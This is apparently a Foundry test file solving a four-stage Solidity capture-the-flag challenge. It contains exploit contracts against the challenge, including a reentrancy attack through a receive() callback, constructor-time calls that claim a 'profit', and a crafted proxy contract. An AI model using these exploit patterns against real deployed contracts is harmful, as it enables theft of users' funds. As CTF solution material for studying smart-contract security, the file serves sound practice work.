// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import "../ctf-challenge/challenge.sol";
contract Solution is Test {
    
    address deployer;
    address attacker;
    GUILD_AUDIT_CHALLENGE challenge;
    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");
        challenge = new GUILD_AUDIT_CHALLENGE();
    }

    function testChallengeA() public {
        vm.startPrank(attacker, attacker);
        vm.deal(attacker, 1 ether);

        //msg.sender == address used in prank
        uint256 valueRequired = (uint32(uint160(attacker)) & 0xffff) / 100;
        bytes32 cRequired = keccak256(abi.encode("0x44\\0x33\\0x22\\0x11\\0x00", attacker));

        challenge.solve_challenge_A{value: valueRequired}(cRequired);
        
        vm.stopPrank();
    }

    function testChallengeB() public {
        testChallengeA();
        attackChallengeTwo attackerContract = new attackChallengeTwo(address(challenge));
        vm.prank(address(attackerContract), attacker);
        challenge.solve_challenge_B();
        
    }

    function testChallengeC() public {
        testChallengeB();

        vm.prank(attacker, attacker);
        solveChallengeC challengeC = new solveChallengeC(address(challenge));
    }

    function testChallengeD() public {
        testChallengeC();

        vm.startPrank(attacker, attacker);
        solveChallengeD pwnChallengeD = new solveChallengeD(address(challenge));
    }


}

interface challengeD {
    function solve_challenge_D(address _proxy) external;
    function solve_challenge_D2() external;
}
interface challengeC {
    function solve_challenge_C(address _newPrincipal) external;
    function get_C_Profit() external;
}

interface challengeB {
        function solve_challenge_B() external ;
        function trustCount(address) external returns (uint256) ;
}

contract solveChallengeD is S_M {


    constructor (address _challengeAddr) {
        challengeD(_challengeAddr).solve_challenge_D(address(this));
    }

    function __expected__() external view returns (MSS_SS_SSM memory) {
        uint16 value = uint16(bytes2(bytes16(
                                keccak256(abi.encode(address(this)))
                            )
        ));
        MSS_SS_SSM memory myStruct = MSS_SS_SSM(1,2,3,4,5,6,7,8,9,7,value,22);
        return myStruct;
    }

}

contract solveChallengeC {
    constructor(address _challengeAddr) {
        challengeC(_challengeAddr).solve_challenge_C(msg.sender);
        challengeC(_challengeAddr).get_C_Profit();
    }
}

contract attackChallengeTwo {

    address challengeAddr;
    constructor(address _challengeAddr) {
        challengeAddr = _challengeAddr;
    }
    receive() external payable {
        if(challengeB(challengeAddr).trustCount(address(this)) == 9) return;
        attack();
    }

    function attack () internal {
        challengeB(challengeAddr).solve_challenge_B();
    }
}